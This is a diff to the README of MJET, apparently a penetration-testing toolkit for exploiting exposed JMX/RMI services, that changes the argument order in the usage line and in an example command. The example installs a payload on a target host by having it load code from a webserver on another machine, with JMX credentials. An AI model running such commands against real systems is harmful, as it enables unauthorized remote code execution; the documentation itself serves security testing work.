@@ -19,7 +19,7 @@ information can be found [here](https://www.optiv.com/blog/exploiting-jmx-rmi) a
 MJET implements a CLI interface (using [argparse](https://docs.python.org/3/library/argparse.html)):
 
 ```
-jython mjet.py targetHost targetPort password MODE (modeOptions)
+jython mjet.py targetHost targetPort MODE password (modeOptions)
 ```
 Where
 
@@ -97,7 +97,7 @@ h0ng10@rocksteady ~/w/mjet>
 
 Installation with JMX credentials (also needs a weak configuration of the server):
 ```
-h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 super_secret install http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
+h0ng10@rocksteady:~/mjet$ jython mjet.py 192.168.11.136 9991 install super_secret http://192.168.11.132:8000 8000 --jmxrole JMXUSER --jmxpassword JMXPASSWORD
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Starting webserver at port 8000
